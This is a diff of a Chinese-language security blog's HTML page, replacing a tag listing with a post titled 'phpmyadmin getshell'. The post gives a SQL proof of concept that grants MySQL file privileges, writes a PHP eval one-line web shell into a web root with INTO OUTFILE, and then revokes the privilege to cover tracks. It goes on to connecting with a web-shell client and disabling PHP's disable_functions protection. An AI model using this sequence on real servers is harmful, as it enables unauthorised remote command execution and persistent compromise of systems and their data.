@@ -4,17 +4,18 @@
   <meta charset="utf-8">
   
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <title>Tag: DDOS | Evilxyz Blog</title>
+  <title>phpmyadmin getshell | Evilxyz Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="I am good at python and django, and i like body-building">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Evilxyz Blog">
-<meta property="og:url" content="http://blog.evilxyz.com/tags/DDOS/index.html">
+  <meta name="description" content="phpmyadmin getshell获得 phpmyadmin 的 root 权限后, 进行写一句话, 一句话的物理路径可参看 mysql 的全局变量 basedir, 模拟环境后可事半功倍.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpmyadmin getshell">
+<meta property="og:url" content="http://blog.evilxyz.com/2016/06/27/phpmyadmin-getshell/index.html">
 <meta property="og:site_name" content="Evilxyz Blog">
-<meta property="og:description" content="I am good at python and django, and i like body-building">
+<meta property="og:description" content="phpmyadmin getshell获得 phpmyadmin 的 root 权限后, 进行写一句话, 一句话的物理路径可参看 mysql 的全局变量 basedir, 模拟环境后可事半功倍.">
+<meta property="og:updated_time" content="2016-06-27T10:08:48.577Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Evilxyz Blog">
-<meta name="twitter:description" content="I am good at python and django, and i like body-building">
+<meta name="twitter:title" content="phpmyadmin getshell">
+<meta name="twitter:description" content="phpmyadmin getshell获得 phpmyadmin 的 root 权限后, 进行写一句话, 一句话的物理路径可参看 mysql 的全局变量 basedir, 模拟环境后可事半功倍.">
   
     <link rel="alternative" href="/atom.xml" title="Evilxyz Blog" type="application/atom+xml">
   
@@ -192,53 +193,95 @@
 	</div>
 </nav>
 
-      <div class="body-wrap">
+      <div class="body-wrap"><article id="post-phpmyadmin-getshell" class="article article-type-post" itemscope itemprop="blogPost">
   
-  
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2016" class="archive-year">2016</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2016/05/24/SYN-Flood-Attack/" class="archive-article-date">
-  	<time datetime="2016-05-24T01:32:09.000Z" itemprop="datePublished">May 24</time>
+    <div class="article-meta">
+      <a href="/2016/06/27/phpmyadmin-getshell/" class="article-date">
+  	<time datetime="2016-06-27T09:11:30.000Z" itemprop="datePublished">2016-06-27</time>
 </a>
-        </div>
-    	 
+    </div>
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2016/05/24/SYN-Flood-Attack/">SYN Flood Attack</a>
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      phpmyadmin getshell
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+      </header>
+      
+      <div class="article-info article-info-post">
+        
 	<div class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DDOS/">DDOS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Destroy/">Destroy</a></li></ul>
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/getshell/">getshell</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/mysql/">mysql</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/phpmyadmin/">phpmyadmin</a></li></ul>
 	</div>
 
-          
+        
 
-        </div>
         <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
+      </div>
+      
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="phpmyadmin-getshell"><a href="#phpmyadmin-getshell" class="headerlink" title="phpmyadmin getshell"></a>phpmyadmin getshell</h2><p>获得 phpmyadmin 的 root 权限后, 进行写一句话, 一句话的物理路径可参看 mysql 的全局变量 <code>basedir</code>, 模拟环境后可事半功倍.</p>
+<a id="more"></a>
+<p>Poc:<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">Drop</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> g3tshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> mysql.user <span class="keyword">set</span> File_priv=<span class="string">'Y'</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span>;  <span class="comment">-- 获取文件读写权限</span></span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">TABLE</span>  (cmd <span class="built_in">text</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">Insert</span> <span class="keyword">INTO</span> g3tshell (cmd) <span class="keyword">VALUES</span>(<span class="string">"&lt;?php eval($_POST[wooyun]);?&gt;"</span>);</span><br><span class="line"><span class="keyword">select</span> cmd <span class="keyword">from</span> g3tshell <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\\MYOA\\webroot\\task\\message.php'</span>;</span><br><span class="line"><span class="keyword">Drop</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> g3tshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">UPDATE</span> mysql.user <span class="keyword">set</span> File_priv=<span class="string">'N'</span> <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span>;</span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br></pre></td></tr></table></figure></p>
+<p>然后使用 <code>Cknife</code> 进行连接.<br>如果可以进行文件管理, 但不可以模拟终端的时候, 那是因为网站在 <code>php.ini</code> 中禁用了系统函数, 把 <code>disable_functions</code> 注释掉即可.</p>
+<p>php.ini<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;<span class="built_in">disable</span>_<span class="built_in">functions</span> = <span class="built_in">exec</span>,shell_<span class="built_in">exec</span>,system,passthru,proc_open,show_<span class="built_in">source</span>,phpinfo</span><br></pre></td></tr></table></figure></p>
+<p>更改 <code>php.ini</code> 需要重启服务, 所以需要一个机会等服务器重启…</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2016/06/20/hydra-manual/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">hydra 手册</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+<div class="duoshuo">
+	<!-- 多说评论框 start -->
+	<div class="ds-thread" data-thread-key="phpmyadmin-getshell" data-title="phpmyadmin getshell" data-url="http://blog.evilxyz.com/2016/06/27/phpmyadmin-getshell/"></div>
+	<!-- 多说评论框 end -->
+	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+	<script type="text/javascript">
+	var duoshuoQuery = {short_name:"evilxyz"};
+	(function() {
+		var ds = document.createElement('script');
+		ds.type = 'text/javascript';ds.async = true;
+		ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+		ds.charset = 'UTF-8';
+		(document.getElementsByTagName('head')[0] 
+		 || document.getElementsByTagName('body')[0]).appendChild(ds);
+	})();
+	</script>
+	<!-- 多说公共JS代码 end -->
+</div>
+
+
+
 
 </div>
       <footer id="footer">
@@ -264,9 +307,9 @@
 		mathjax: true,
 		animate: true,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
-		isTag: true,
+		isTag: false,
 		isCategory: false,
 		open_in_new: false
 	}
